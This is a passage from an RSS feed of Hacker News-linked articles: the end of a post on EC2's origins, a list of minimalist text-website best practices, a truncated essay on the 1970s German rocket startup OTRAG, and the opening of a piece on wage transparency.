<p>After presenting the “executive brief” paper to Jeff, the realities of turning this hare-brained scheme into a real service meant involving the smartest folks around (i.e., not me). In the Amazon style of “starting from the customer and working backwards”, we produced a “press release” and a <span>FAQ</span> to further detail the how and why of what would become EC2. At this point attention turned from these paper pushing exercises to specifics of getting it built. Most importantly, who would lead the effort?</p>
<p>Everyone seemed to leap at once to the same conclusion: Pinkham. And so it was that Pinkham returned to South Africa, taking a stellar lead developer with him, and they built the EC2 team, then built EC2. That last part seems awfully compressed, doesn’t it? Well, that’s because I had almost no interaction with the EC2 team. They went off and kicked a lot of ass and the rest is history.</p>
<p>The end.</p>
<p>Want more data? Here’s Jeff in a 2008 interview with Om Malik…</p>

<time datetime="2009-01-25">
  —Jan 25, 2009
</time>
</article></div>]]>
            </description>
            <link>http://blog.b3k.us/2009/01/25/ec2-origins.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25198157</guid>
            <pubDate>Tue, 24 Nov 2020 13:18:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An opinionated list of best practices for textual websites]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25197950">thread link</a>) | @kkoncevicius
<br/>
November 24, 2020 | https://seirdy.one/2020/11/23/website-best-practices.html | <a href="https://web.archive.org/web/*/https://seirdy.one/2020/11/23/website-best-practices.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
	<p><em>The following applies to minimal websites that focus primarily on text. It does not
apply to websites that have a lot of non-textual content. It also does not apply to
websites that focus more on generating revenue or pleasing investors than being good
websites.</em></p>
<p>This is a “living document” that I add to as I receive feedback. See the
<a href="https://git.sr.ht/~seirdy/seirdy.one/log/master/content/posts/website-best-practices.md">changelog</a>.</p>
<p>I realize not everybody’s going to ditch the Web and switch to Gemini or Gopher today
(that’ll take, like, a month at the longest). Until that happens, here’s a
non-exhaustive, highly-opinionated list of best practices for websites that focus
primarily on text:</p>
<ul>
<li>Final page weight under 50kb without images, and under 200kb with images.</li>
<li>Works in Lynx, w3m, links (both graphics and text mode), Netsurf, and Dillo</li>
<li>Works with popular article-extractors (e.g.&nbsp;Readability) and HTML-to-Markdown
converters. This is a good way to verify that your site uses simple HTML and works
with most non-browser article readers (e.g.&nbsp;ebook converters, PDF exports).</li>
<li>No scripts or interactivity (preferably enforced at the CSP level)</li>
<li>No cookies</li>
<li>No animations</li>
<li>No fonts–local or remote–besides <code>sans-serif</code> and <code>monospace</code>. More on this
below.</li>
<li>No referrers</li>
<li>No requests after the page finishes loading</li>
<li>No 3rd-party resources (preferably enforced at the CSP level)</li>
<li>No lazy loading (more on this below)</li>
<li>No custom colors OR explicitly set the both foreground and background colors. More
on this below.</li>
<li>A maximum line length for readability</li>
<li>Server configured to support compression (gzip, optionally zstd as well). It’s a
free speed boost.</li>
<li>Supports dark mode via a CSS media feature and/or works with most “dark mode”
browser addons. More on this below.</li>
<li>A good score on Mozilla’s <a href="https://observatory.mozilla.org/">HTTP Observatory</a></li>
<li>Optimized images.</li>
<li>Maybe HTTP/2. There are some cases in which HTTP/2 can make things slower. Run some
tests to find out.</li>
</ul>
<p>I’d like to re-iterate yet another time that this only applies to websites that
primarily focus on text. If graphics, interactivity, etc. are an important part of
your website, less (possibly none) of this article applies.</p>
<p>Earlier revisions of this post generated some responses I thought I should address
below. Special thanks to the IRC and <a href="https://lobste.rs/s/akcw1m">Lobsters</a> users who
gave good feedback!</p>
<h2 id="about-fonts">About fonts</h2>
<p>If you <em>really</em> want, you could use <code>serif</code> instead of <code>sans-serif</code>, but serif fonts
tend to look worse on low-res monitors. Not every screen’s DPI has three digits.</p>
<p>To ship custom fonts is to assert that branding is more important than user choice.
That might very well be a reasonable thing to do; branding isn’t evil! It isn’t
<em>usually</em> the case for textual websites, though. Beyond basic layout and optionally
supporting dark mode, authors generally shouldn’t dictate the presentation of their
websites; that is the job of the user agent. Most websites are not important enough
to look completely different from the rest of the user’s system.</p>
<p>A personal example: I set my preferred fonts in my computer’s fontconfig settings.
Now every website that uses <code>sans-serif</code> will have my preferred font. Sites with
<code>sans-serif</code> blend into the users' systems instead of sticking out.</p>
<h3 id="but-most-users-dont-change-their-fonts">But most users don’t change their fonts…</h3>
<p>The “users don’t know better and need us to make decisions for them” mindset isn’t
without merits; however, in my opinion, it’s overused. Using system fonts doesn’t
make your website harder to use, but it does make it smaller and stick out less to
the subset of users who care enough about fonts to change them. This argument isn’t
about making software easier for non-technical users; it’s about branding by
asserting a personal preference.</p>
<h3 id="cant-users-globally-override-stylesheets-instead">Can’t users globally override stylesheets instead?</h3>
<p>It’s not a good idea to require users to automatically override website stylesheets.
Doing so would break websites that use fonts such as Font Awesome to display vector
icons. We shouldn’t have these users constantly battle with websites the same way
that many adblocking/script-blocking users (myself included) already do when there’s
a better option.</p>
<p>That being said, many users <em>do</em> actually override stylesheets. We shouldn’t
<em>require</em> them to do so, but we should keep our pages from breaking in case they do.
Pages following this article’s advice will probably work perfectly well in these
cases without any extra effort.</p>
<h3 id="but-wouldnt-that-allow-a-website-to-fingerprint-with-fonts">But wouldn’t that allow a website to fingerprint with fonts?</h3>
<p>I don’t know much about fingerprinting, except that you can’t do font enumeration
without JavaScript. Since text-based websites that follow these best-practices don’t
send requests after the page loads and have no scripts, fingerprinting via font
enumeration is a non-issue on those sites.</p>
<p>Other websites can still fingerprint via font enumeration using JavaScript. They
don’t need to stop at seeing what sans-serif maps to; they can see all the available
fonts on a user’s system, the user’s canvas fingerprint, window dimensions, etc. Some
of these can be mitigated with Firefox’s <code>privacy.resistFingerprinting</code> setting, but
that setting also understandably overrides user font preferences.</p>
<p>Ultimately, surveillance self-defense on the web is an arms race full of trade-offs.
If you want both privacy and customizability, the web is not the place to look; try
Gemini or Gopher instead.</p>
<h2 id="about-lazy-loading">About lazy loading</h2>
<p>For users on slow connections, lazy loading is often frustrating. I think I can speak
for some of these users: mobile data near my home has a number of “dead zones” with
abysmal download speeds, and my home’s Wi-Fi repeater setup occasionally results in
packet loss rates above 60% (!!).</p>
<p>Users on poor connections have better things to do than idly wait for pages to load.
They might open multiple links in background tabs to wait for them all to load at
once, or switch to another window/app and come back when loading finishes. They might
also open links while on a good connection before switching to a poor connection; I
know that I often open 10-20 links on Wi-Fi before going out for a walk in a
mobile-data dead-zone.</p>
<p>Unfortunately, pages with lazy loading don’t finish loading off-screen images in the
background. To load this content ahead of time, users need to switch to the loading
page and slowly scroll to the bottom to ensure that all the important content appears
on-screen and starts loading. Website owners shouldn’t expect users to have to jump
through these ridiculous hoops.</p>
<h3 id="wouldnt-this-be-solved-by-combining-lazy-loading-with-pre-loadingpre-fetching">Wouldn’t this be solved by combining lazy loading with pre-loading/pre-fetching?</h3>
<p>A large number of users with poor connections also have capped data, and would prefer
that pages don’t decide to predictively load content ahead-of-time for them. Some go
so far as to disable this behavior to avoid data overages. Savvy privacy-conscious
users also generally disable pre-loading because they don’t have reason to trust that
linked content doesn’t practice dark patterns like tracking without consent.</p>
<p>Users who click a link <em>choose</em> to load a full page. Loading pages that a user hasn’t
clicked on is making a choice for that user.</p>
<h3 id="cant-users-on-poor-connections-disable-images">Can’t users on poor connections disable images?</h3>
<p>I have two responses:</p>
<ol>
<li>If an image isn’t essential, you shouldn’t include it inline.</li>
<li>Yes, users could disable images. That’s <em>their</em> choice. If your page uses lazy
loading, you’ve effectively (and probably unintentionally) made that choice for a
large number of users.</li>
</ol>
<h2 id="about-custom-colors">About custom colors</h2>
<p>Some users' browsers set default page colors that aren’t black-on-white. For
instance, Linux users who enable GTK style overrides might default to having white
text on a dark background. Websites that explicitly set foreground colors but leave
the default background color (or vice-versa) end up being difficult to read. Here’s
an example:</p>
<picture>
<source srcset="https://seirdy.one/misc/website_colors.webp" type="image/webp">
<img src="https://seirdy.one/misc/website_colors.png" alt="This page with a grey background, a header with unreadable black/grey text, and unreadable white-on-white code snippets">
</picture>
<p>If you do explicitly set colors, please also include a dark theme using a media
query: <code>@media (prefers-color-scheme: dark)</code>. For more info, read the relevant docs
<a href="https://developer.mozilla.org/en-US/docs/Web/CSS/@media/prefers-color-scheme">on
MDN</a></p>
<h2 id="image-optimization">Image optimization</h2>
<p>Some image optimization tools I use:</p>
<ul>
<li><a href="http://pngquant.org/">pngquant</a> (lossy)</li>
<li><a href="https://github.com/shssoichiro/oxipng">Oxipng</a> (lossless)</li>
<li><a href="https://github.com/tjko/jpegoptim">jpegoptim</a> (lossless or lossy)</li>
<li><a href="https://developers.google.com/speed/webp/docs/cwebp">cwebp</a> (lossless or lossy)</li>
</ul>
<p>I put together a <a href="https://git.sr.ht/~seirdy/dotfiles/tree/3b722a843f3945a1bdf98672e09786f0213ec6f6/Executables/shell-scripts/bin/optimize-image">quick
script</a>
to losslessly optimize images using these programs in my dotfile repo.</p>
<p>You also might want to use the HTML <code>&lt;picture&gt;</code> element, using JPEG/PNG as a fallback
for more efficient formats such as WebP or AVIF. More info in the <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/picture">MDN
docs</a></p>
<p>Most of my images will probably be screenshots that start as PNGs. My typical flow:</p>
<ol>
<li>Lossy compression with <code>pngquant</code></li>
<li>Losslessly optimize the result with <code>oxipng</code> and its Zopfli backend (slow)</li>
<li>Also create a lossless WebP from the lossy PNG, using <code>cwebp</code></li>
<li>Include the resulting WebP in the page, with a fallback to the PNG using a <code>&lt;picture&gt;</code> element.</li>
</ol>
<p>It might seem odd to create a lossless WebP from a lossy PNG, but I’ve found that it’s the best way to get the smallest possible image at the minimum acceptable quality for screenshots with solid backgrounds.</p>
<h2 id="other-places-to-check-out">Other places to check out</h2>
<p>The <a href="https://250kb.club/">250kb club</a> gathers websites at or under 250kb, and also
rewards websites that have a high ratio of content size to total size.</p>
<p>Also see <a href="https://motherfuckingwebsite.com/">Motherfucking Website</a>. Motherfucking
Website inspired several unofficial sequels that tried to gently improve upon it. My
favorite is <a href="https://bestmotherfucking.website/">Best Motherfucking Website</a>.</p>
</article></div>]]>
            </description>
            <link>https://seirdy.one/2020/11/23/website-best-practices.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25197950</guid>
            <pubDate>Tue, 24 Nov 2020 12:46:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The German Elon of the 70s]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25197941">thread link</a>) | @revolucien
<br/>
November 24, 2020 | https://www.muellerfreitag.com/essays/the-german-elon-of-the-70s | <a href="https://web.archive.org/web/*/https://www.muellerfreitag.com/essays/the-german-elon-of-the-70s">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-nc-base="header" data-controller="AncillaryLayout">
      

      

      <div>

        

        <div>
          

          <main>
            
              <section data-content-field="main-content">
                <article id="post-5f18775b30d9fd6c1ed21e6a" data-item-id="5f18775b30d9fd6c1ed21e6a">

    
      
    

    <div data-layout-label="Post Body" data-type="item" data-updated-on="1595439165510" id="item-5f18775b30d9fd6c1ed21e6a"><div><div><div data-block-type="5" id="block-yui_3_17_2_1_1595439201816_6409"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5f11f960974e102b616d905f/1595439277525-N1KY1FTDNW9EB1P2KT6U/ke17ZwdGBToddI8pDm48kKtijf5x5S0rIV7X_qDH3dB7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UaZbTVdO5VSPAOxIcVIbmIFLIFeVDbQiz7iBIgNCzklBDD2o6CESiqIlH5ssNFrtmA/Lutz_Kayser.jpg" data-image="https://images.squarespace-cdn.com/content/v1/5f11f960974e102b616d905f/1595439277525-N1KY1FTDNW9EB1P2KT6U/ke17ZwdGBToddI8pDm48kKtijf5x5S0rIV7X_qDH3dB7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UaZbTVdO5VSPAOxIcVIbmIFLIFeVDbQiz7iBIgNCzklBDD2o6CESiqIlH5ssNFrtmA/Lutz_Kayser.jpg" data-image-dimensions="2400x1600" data-image-focal-point="0.5,0.5" alt="Meet Lutz Kayser, the pioneering rocket engineer and founder of OTRAG  (Source:    OTRAG   )" data-load="false" data-image-id="5f18789af192c5616c553b96" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5f11f960974e102b616d905f/1595439277525-N1KY1FTDNW9EB1P2KT6U/ke17ZwdGBToddI8pDm48kKtijf5x5S0rIV7X_qDH3dB7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UaZbTVdO5VSPAOxIcVIbmIFLIFeVDbQiz7iBIgNCzklBDD2o6CESiqIlH5ssNFrtmA/Lutz_Kayser.jpg">
          </p>
        
          
        

        
          
          <figcaption>
            <p>Meet Lutz Kayser, the pioneering rocket engineer and founder of OTRAG<em> (Source: </em><a href="http://otrag.com/" target="_blank"><em>OTRAG</em></a><em>)</em></p>
          </figcaption>
        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-1f175e5db5ee82782e37"><div><p>It’s 1977 and you’re standing on a rocky plateau overlooking the dense jungle of Zaire in what is now modern-day Congo. You and a group of maverick engineers work for OTRAG, a West German rocket startup that is sponsored by Zaire’s dictator, Mobutu Sese Seko. After many months of toil in the African bushland, you’re ready to launch the world’s first privately developed rocket booster––a 9-meter (30 ft) tall juggernaut which, from a distance, looks like a bundle of aluminum pencils with a nose cone. The countdown proceeds smoothly. Then finally, there’s liftoff: The rocket leaves the launch pad with a deafening roar and climbs to an altitude of 12 km (7.5 miles) before plummeting back to Earth. The plateau erupts in jubilation.</p><p>Wait, what? This unlikely scene from the jungle might sound crazy to you. A private rocket company from West Germany that is attempting to make it into space in the late seventies? That’s more than three decades before Elon Musk’s <a href="https://en.wikipedia.org/wiki/SpaceX" target="_blank">SpaceX</a> successfully launched its first rocket, the <a href="https://www.youtube.com/watch?v=dLQ2tZEH6G0" target="_blank">Falcon 1</a>, into orbit. But this incredible and long-forgotten tale is entirely true and forms the plot of the documentary<em> </em><a href="https://vimeo.com/300738920" target="_blank"><em>Fly Rocket Fly</em></a><em>, </em>which premiered at the Munich Film Festival in 2018. The film is now available to stream on <a href="https://www.amazon.com/Fly-Rocket-Lutz-Keyser/dp/B082H4WJJG" target="_blank">Amazon Prime</a> and <a href="https://vimeo.com/ondemand/flyrocketfly" target="_blank">Vimeo</a>.</p><p>The rise and fall of OTRAG is one of the strangest, and most remarkable, startup tales I’ve encountered to date. It’s an almost surreal story of entrepreneurial adventure and ambition that bears an astonishing resemblance to Werner Herzog’s<em> </em><a href="https://en.wikipedia.org/wiki/Fitzcarraldo" target="_blank"><em>Fitzcarraldo</em></a><em>. </em>In Herzog’s 1982 movie, Klaus Kinski plays an obsessive dreamer who manually drags his massive steamship over a steep hill in the Amazon jungle. Unfortunately for Fitzcarraldo, this astonishing engineering feat doesn’t translate into his mission’s overall success (Herzog later went so far as to call it a “<a href="https://www.nytimes.com/2009/08/02/books/review/Harris-t.html" target="_blank">conquest of the useless</a>”). The same could be said about OTRAG. Despite a number of successful test launches, OTRAG was a spectacular failure. The company burned through massive amounts of funding and eventually ran afoul of Cold War politics. Its demise is a case study in what happens to startups when their timing is wrong, their technology speculative, and their market unwilling to embrace disruptive innovation.</p><h3><strong>The Emperor of OTRAG</strong></h3><p>All startups are a reflection of their founders. The man behind the rocket-building adventure in the jungle was Lutz Kayser, a German aerospace engineer who was something of a 20th-century Elon Musk. Kayser began pursuing his dream of a low-cost rocket launcher in the 1960s. As a student of rocket pioneer <a href="https://en.wikipedia.org/wiki/Eugen_S%C3%A4nger" target="_blank">Eugen Sänger</a>, he experimented with new propulsion systems using industrially available components and low-cost fuels. The initial work with Sänger carried over into Kayser’s first startup, Technology Research Ltd., which he founded in 1970. The company received several million Deutschmark in research grants and was hired by the West German government to explore a low-cost alternative to the ailing <a href="https://en.wikipedia.org/wiki/Europa_(rocket)" target="_blank">Europa II</a> rocket program.&nbsp;</p><p>It was during this time that Kayser developed his vision for a low-cost, modular rocket system that could transport satellites into orbit<em>.</em> The idea was as simple as it was revolutionary: it involved the parallel clustering of many standard fuel tank and engine modules <em>(Bündelrakete)</em>. The smallest flight-worthy rocket module consisted of four clustered tank units and four identical engines. Bigger, more powerful boosters could be constructed by bundling together larger quantities of these tank-and-engine modules. The largest configuration on paper had as many as 600 individual engines! And there was another idiosyncrasy to the design: instead of being stacked <em>atop</em> one another, the stages would be nested <em>inside</em> one another and shed like layers of an onion as they burned out. This arrangement didn’t make for a particularly handsome vehicle and the rocket’s design was frequently compared to a<em> </em>bundle of asparagus. But aesthetics weren’t the point; “low cost, not high tech” was the North Star.</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1606063350099_13600"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5f11f960974e102b616d905f/1606064185347-VN7XY7VCBE5NGAOK3N04/ke17ZwdGBToddI8pDm48kJmhqGN-mSClKRKwJ41evzEUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYy7Mythp_T-mtop-vrsUOmeInPi9iDjx9w8K4ZfjXt2dt65uYDq5wjmpAbzmJV4EKyPzCeG_9Y6bPguKi4sPluTCjLISwBs8eEdxAxTptZAUg/1.png" data-image="https://images.squarespace-cdn.com/content/v1/5f11f960974e102b616d905f/1606064185347-VN7XY7VCBE5NGAOK3N04/ke17ZwdGBToddI8pDm48kJmhqGN-mSClKRKwJ41evzEUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYy7Mythp_T-mtop-vrsUOmeInPi9iDjx9w8K4ZfjXt2dt65uYDq5wjmpAbzmJV4EKyPzCeG_9Y6bPguKi4sPluTCjLISwBs8eEdxAxTptZAUg/1.png" data-image-dimensions="1988x966" data-image-focal-point="0.5,0.5" alt="Lutz Kayser with a prototype of his “cluster rocket” (left), next to a design sketch by Klaus Bürgle (right).  Source:    OTRAG" data-load="false" data-image-id="5fba982f2b4bfe31fd69b8dc" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5f11f960974e102b616d905f/1606064185347-VN7XY7VCBE5NGAOK3N04/ke17ZwdGBToddI8pDm48kJmhqGN-mSClKRKwJ41evzEUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYy7Mythp_T-mtop-vrsUOmeInPi9iDjx9w8K4ZfjXt2dt65uYDq5wjmpAbzmJV4EKyPzCeG_9Y6bPguKi4sPluTCjLISwBs8eEdxAxTptZAUg/1.png">
          </p>
        
          
        

        
          
          <figcaption>
            <p>Lutz Kayser with a prototype of his “cluster rocket” (left), next to a design sketch by Klaus Bürgle (right). <em>Source: </em><a href="http://otrag.com/" target="_blank"><em>OTRAG</em></a></p>
          </figcaption>
        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1606063350099_15492"><div><p>The key to holding down the rocket’s cost lay in three simple design principles, some of which have been rediscovered by the current crop of “<a href="https://en.wikipedia.org/wiki/Private_spaceflight#NewSpace_terminology" target="_blank">NewSpace</a>” companies. The first principle was rooted in the modular platform architecture itself. Building a whole family of launch vehicles around the same tank-and-engine modules simplified the vehicle configuration and saved millions in development costs. It also meant lots of tanks and engines in production, generating both economies of scale and lower prices. SpaceX applies the same design philosophy today: its main rocket, the <a href="https://en.wikipedia.org/wiki/Falcon_9" target="_blank">Falcon 9</a>, employs nine identical engines (plus another one to power the second stage), while the <a href="https://en.wikipedia.org/wiki/Falcon_Heavy" target="_blank">Falcon Heavy</a> uses 27 units of the same engine. This creates a virtuous cycle whereby the operating model helps drive the business model: being the cheapest launch provider in the market translates into a greater number of launch contracts, which in turn drives higher volumes and scale efficiencies. Once this flywheel is in motion, it becomes easier to run the business as it continues to operate.</p><p>The second design principle was to use mass produced, commercially available components instead of expensive “space grade” equipment from government contractors. The tank units, for example, were made of long pipeline tubes that were manufactured by the German steelmaker Krupp. Amusingly, a Volkswagen windshield-wiper motor was used to open and close the valves that controlled the propellant flow to the engines. Complex and trouble-prone components, like <a href="https://en.wikipedia.org/wiki/Turbopump" target="_blank">turbopumps</a> or <a href="https://en.wikipedia.org/wiki/Gimbaled_thrust" target="_blank">gimbals</a>, were avoided altogether. Instead, the fuel tanks were partially filled with compressed air that forced the propellant into the engines, and the rocket was steered by throttling back individual engines on the side where less thrust was desired. SpaceX would later use components from existing supply chains as well: The Falcon 1 used readily available car wash valves with modified seals to feed propellant into the engine, while the first <a href="https://en.wikipedia.org/wiki/SpaceX_Dragon" target="_blank">Dragon</a> spacecraft utilized a modified bathroom stall latch for securing the cargo lockers.</p><p>The third design principle was a simplified rocket engine that could run on extremely low-cost fuels. The<em> </em>basic job of rocket fuel is to burn steadily and intensely when combined with an oxidizer. Once the fuel and oxidizer are fed through an injector into the combustion chamber, they produce a hot gas that shoots out of the bell-shaped exhaust nozzle at the bottom. This creates the necessary thrust to launch the rocket upwards. The most common rocket propellant in use today is a mix of ultra-refined kerosene (RP-1) and liquid oxygen (LOX). SpaceX, <a href="https://en.wikipedia.org/wiki/Rocket_Lab" target="_blank">Rocket Lab</a>, and many other launch providers work with this fuel mix. Kayser, in contrast, opted for a much cheaper propellant combination: regular diesel oil as fuel and nitric acid as oxidizer. Though providing less thrust per pound than RP-1/LOX and being extremely toxic, this combination cost only 5% as much and was readily available.&nbsp;</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1606063350099_27594"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5f11f960974e102b616d905f/1606064291685-VEMSFLQL8VPXVMHIP4SE/ke17ZwdGBToddI8pDm48kFhaRfXD0sHRzS4HFtXwQmMUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYy7Mythp_T-mtop-vrsUOmeInPi9iDjx9w8K4ZfjXt2dnuqrDbxeiwpNrWn4d5W-MeZh_NIeMKNsMLkG5wAFm5KCjLISwBs8eEdxAxTptZAUg/2.png" data-image="https://images.squarespace-cdn.com/content/v1/5f11f960974e102b616d905f/1606064291685-VEMSFLQL8VPXVMHIP4SE/ke17ZwdGBToddI8pDm48kFhaRfXD0sHRzS4HFtXwQmMUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYy7Mythp_T-mtop-vrsUOmeInPi9iDjx9w8K4ZfjXt2dnuqrDbxeiwpNrWn4d5W-MeZh_NIeMKNsMLkG5wAFm5KCjLISwBs8eEdxAxTptZAUg/2.png" data-image-dimensions="1986x962" data-image-focal-point="0.5,0.5" alt="Kayser in the control center at the German Aerospace Center in Lampoldshausen.  Source:    OTRAG" data-load="false" data-image-id="5fba9899317ba5146213cb17" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5f11f960974e102b616d905f/1606064291685-VEMSFLQL8VPXVMHIP4SE/ke17ZwdGBToddI8pDm48kFhaRfXD0sHRzS4HFtXwQmMUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYy7Mythp_T-mtop-vrsUOmeInPi9iDjx9w8K4ZfjXt2dnuqrDbxeiwpNrWn4d5W-MeZh_NIeMKNsMLkG5wAFm5KCjLISwBs8eEdxAxTptZAUg/2.png">
          </p>
        
          
        

        
          
          <figcaption>
            <p>Kayser in the control center at the German Aerospace Center in Lampoldshausen. <em>Source: </em><a href="http://otrag.com/" target="_blank"><em>OTRAG</em></a></p>
          </figcaption>
        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1606063350099_29089"><div><p>Much of the early work on this novel rocket concept was done at a test stand rented from the German Aerospace Center in <a href="https://www.dlr.de/content/en/articles/sites/lampholdshausen/about-lampoldhausen.html" target="_blank">Lampoldshausen</a>, north of Stuttgart. Over a period of four years, Kayser’s team went through hundreds of test firings to perfect the diesel oil/nitric acid cocktail. The biggest challenge around getting the engine to work was the “<a href="https://en.wikipedia.org/wiki/Hypergolic_propellant" target="_blank">hypergolic</a>” nature of the fuel mix: diesel oil and nitric acid ignite immediately upon contact and are subject to <a href="https://en.wikipedia.org/wiki/Combustion_instability" target="_blank">unstable burning</a>. Just getting the engine started was difficult: if ignition happened too late, a pool of almost-ready to burn propellant had already accumulated in the combustion chamber, triggering an explosion that would demolish the engine and its immediate surroundings. The group eventually achieved a breakthrough by inventing a radial fuel injection system that provided the right vapor mixture of fuel and oxidizer.</p><p>Then came an unexpected setback. By 1974, the West German government had lost interest in the project and decided to concentrate its rocket research efforts on a new, pan-European launch vehicle, the <a href="https://en.wikipedia.org/wiki/Ariane_1" target="_blank">Ariane 1</a>. Technology Research Ltd.’s fiscal tap<em> </em>was shut off. Kayser was undeterred. He began looking for private funding to bring his rocket to market but it was difficult. Venture capital as we know it today didn’t exist in 1974. Venerable firms like <a href="https://www.kleinerperkins.com/our-history/" target="_blank">Kleiner Perkins</a> and <a href="https://www.sequoiacap.com/article/remembering-don-valentine/" target="_blank">Sequoia</a>, both founded in 1972, were still in their infancy and unavailable to a little-known entrepreneur from West Germany. Kayser’s only option was a highly unorthodox crowdfunding strategy: he decided to raise money from wealthy individuals who wrote off their investment through tax deductions <em>(Abschreibungsgesellschaft). </em>Few investors believed that Kayser’s company would actually succeed, but that …</p></div></div></div></div></div></article></section></main></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.muellerfreitag.com/essays/the-german-elon-of-the-70s">https://www.muellerfreitag.com/essays/the-german-elon-of-the-70s</a></em></p>]]>
            </description>
            <link>https://www.muellerfreitag.com/essays/the-german-elon-of-the-70s</link>
            <guid isPermaLink="false">hacker-news-small-sites-25197941</guid>
            <pubDate>Tue, 24 Nov 2020 12:45:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ask Your Coworkers What They Make. You’ll Earn More]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25197935">thread link</a>) | @Fiveplus
<br/>
November 24, 2020 | https://civicskunk.works/ask-your-coworkers-what-they-make-youll-earn-more-46efb2daf63e | <a href="https://web.archive.org/web/*/https://civicskunk.works/ask-your-coworkers-what-they-make-youll-earn-more-46efb2daf63e">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><h2 id="1842">Lack of wage transparency is a real factor in suppressing American wages.</h2><div><div><div><p><a href="https://medium.com/@Nick_Cassella?source=post_page-----46efb2daf63e--------------------------------" rel="noopener"><img alt="Nick Cassella" src="https://miro.medium.com/fit/c/96/96/0*1ojfl3YBepASbp5C.jpg" width="48" height="48"></a></p></div></div></div><p id="1bb9">I remember the uneasiness of asking for my first raise—only to have my boss tell me the number I had in mind would make me the “highest paid employee.” It was a startling admission. I was asking for $44,000 a year, which seemed reasonable to me. But I didn’t know how my pay compared to the business’ other five employees. So I didn’t call my boss’ bluff. I settled for $42,000.</p><p id="b7d1">You probably don’t know how much your coworkers make either. I get it. It’s an awkward conversation to have. It’s taboo. Plus, do you really want to discover that Stephen makes $20,000 more than you? No. So you don’t ask. You skirt around the issue, only talking about your pay in the privacy of your own home.</p><p id="4ac1">There is a serious price to pay for keeping your salary secret, though: it benefits your boss. Their asymmetric knowledge of who earns what enables them to pay you “<a href="http://www.hamiltonproject.org/people/benjamin_harris" rel="noopener">less than [your] economic value</a>” demands, as my experience illustrates.</p><p id="208c">Now, standard economic theory suggests that this shouldn’t happen. In a competitive labor market, a worker’s pay is determined by the economic value of their labor. If a business underpays its employees, then they should expect to have their workforce leave for better jobs. But one of the features of a competitive market is “<a href="http://www.economicsdiscussion.net/market/features-of-a-perfectly-competitive-market/7108" rel="noopener">perfect knowledge</a>”; that is, both businesses and employees possess the same information.</p><p id="7b27">However, that’s not the case in America today. While websites like Glassdoor supply people with greater awareness of salaries and benefits, these “<a href="http://www.hamiltonproject.org/papers/information_is_power_fostering_labor_market_competition_through_transparent" rel="noopener">data sources all have considerable weaknesses when it comes to gaining a precise understanding of prevailing wages</a>.” To get a leg up over their employees, more than half of employers <a href="http://www.hamiltonproject.org/papers/information_is_power_fostering_labor_market_competition_through_transparent" rel="noopener">conduct their own salary surveys</a>. These employers generally don’t share their findings with the employees. Instead, they say, “Trust us, we offer competitive compensation.”</p><p id="0e4e">Is it any wonder America suffers from decades of stagnant wages?</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2432/1*uVgy2c4ZV8MuzgXQM1xcoQ.png" width="1216" height="1149" srcset="https://miro.medium.com/max/552/1*uVgy2c4ZV8MuzgXQM1xcoQ.png 276w, https://miro.medium.com/max/1104/1*uVgy2c4ZV8MuzgXQM1xcoQ.png 552w, https://miro.medium.com/max/1280/1*uVgy2c4ZV8MuzgXQM1xcoQ.png 640w, https://miro.medium.com/max/1400/1*uVgy2c4ZV8MuzgXQM1xcoQ.png 700w" sizes="700px" 